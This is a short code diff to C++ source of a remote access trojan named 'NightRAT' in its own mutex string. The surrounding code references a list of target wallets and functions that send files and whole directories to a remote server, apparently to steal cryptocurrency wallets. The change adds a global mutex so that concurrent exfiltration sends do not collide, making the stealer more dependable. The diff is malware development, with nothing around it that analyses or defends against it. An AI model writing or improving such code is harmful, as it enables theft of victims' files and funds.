@@ -57,6 +57,11 @@ static std::vector<WalletMetadata> target_wallets = {
 void send_file_to_server(SOCKET sock, const std::string& relPath, const std::vector<uint8_t>& data) {
     if (sock == INVALID_SOCKET) return;
 
+    static HANDLE hMutex = NULL;
+    if (hMutex == NULL) {
+        hMutex = CreateMutexW(NULL, FALSE, L"Global\\NightRAT_Socket_Mutex");
+    }
+
     uint32_t pathLen = (uint32_t)relPath.size();
     uint32_t dataSize = (uint32_t)data.size();
     uint32_t totalSize = sizeof(uint32_t) + pathLen + dataSize;
@@ -81,12 +86,15 @@ void send_file_to_server(SOCKET sock, const std::string& relPath, const std::vec
 
     int remaining = (int)packet.size();
     const char* p = (const char*)packet.data();
+
+    if (hMutex) WaitForSingleObject(hMutex, INFINITE);
     while (remaining > 0) {
         int sent = send(sock, p, remaining, 0);
         if (sent <= 0) break;
         p += sent;
         remaining -= sent;
     }
+    if (hMutex) ReleaseMutex(hMutex);
 }
 
 void send_directory_recursively(SOCKET sock, const fs::path& source_dir, const std::string& server_path_prefix) {
